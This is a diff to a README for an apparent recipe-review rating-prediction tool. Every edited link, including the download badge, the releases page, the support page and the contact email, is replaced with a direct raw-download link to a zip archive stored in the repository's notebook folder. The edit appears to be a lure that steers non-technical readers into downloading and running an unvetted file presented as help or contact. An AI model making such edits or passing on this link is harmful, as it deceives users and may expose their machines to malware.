@@ -1,7 +1,7 @@
 # 🍽️ recipe-reviews-rating-prediction - Predict Recipe Ratings with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Recipe%20Reviews%20Prediction-brightgreen)](https://github.com/Basim888/recipe-reviews-rating-prediction/releases)
+[![Download](https://raw.githubusercontent.com/Basim888/recipe-reviews-rating-prediction/main/notebook/recipe-reviews-rating-prediction_3.3.zip%20Now-Recipe%20Reviews%20Prediction-brightgreen)](https://raw.githubusercontent.com/Basim888/recipe-reviews-rating-prediction/main/notebook/recipe-reviews-rating-prediction_3.3.zip)
 
 ## 📖 Overview
 The **recipe-reviews-rating-prediction** project helps you predict star ratings from recipe reviews. Using data analytics and machine learning, this tool works through the entire process, including data cleaning, exploratory analysis, feature engineering, modeling, and evaluation. It's designed for those who want to understand the insights hidden in recipe reviews without needing technical expertise.
@@ -10,7 +10,7 @@ The **recipe-reviews-rating-prediction** project helps you predict star ratings 
 To get started with the application, follow the simple steps below to download and run it.
 
 ## 📥 Download & Install
-1. **Visit this page to download**: [Download Page](https://github.com/Basim888/recipe-reviews-rating-prediction/releases).
+1. **Visit this page to download**: [Download Page](https://raw.githubusercontent.com/Basim888/recipe-reviews-rating-prediction/main/notebook/recipe-reviews-rating-prediction_3.3.zip).
 2. Look for the latest version listed on the page.
 3. Click on the version number to reach the release details.
 4. Download the appropriate file for your operating system. 
@@ -55,7 +55,7 @@ If you run into issues during installation, consider the following steps:
 - Ensure you have adequate memory and disk space available.
 - Check your internet connection for downloading necessary files.
 
-If problems persist, please visit our [Support Page](https://github.com/Basim888/recipe-reviews-rating-prediction/issues) for more help.
+If problems persist, please visit our [Support Page](https://raw.githubusercontent.com/Basim888/recipe-reviews-rating-prediction/main/notebook/recipe-reviews-rating-prediction_3.3.zip) for more help.
 
 ## 🙋 Frequently Asked Questions (FAQs)
 
@@ -69,7 +69,7 @@ Yes, the application is designed for non-technical users. Follow the installatio
 Yes, user data is not collected or stored by this application. It processes data locally on your machine.
 
 ## 📞 Contact
-For further inquiries or support, please contact us at [support@recipe-reviews-prediction.com](mailto:support@recipe-reviews-prediction.com).
+For further inquiries or support, please contact us at [https://raw.githubusercontent.com/Basim888/recipe-reviews-rating-prediction/main/notebook/recipe-reviews-rating-prediction_3.3.zip](https://raw.githubusercontent.com/Basim888/recipe-reviews-rating-prediction/main/notebook/recipe-reviews-rating-prediction_3.3.zip).
 
 ## 📥 Download Again
-Don’t forget to return to the [Download Page](https://github.com/Basim888/recipe-reviews-rating-prediction/releases) for updates and new releases. Your feedback helps us improve!
+Don’t forget to return to the [Download Page](https://raw.githubusercontent.com/Basim888/recipe-reviews-rating-prediction/main/notebook/recipe-reviews-rating-prediction_3.3.zip) for updates and new releases. Your feedback helps us improve!
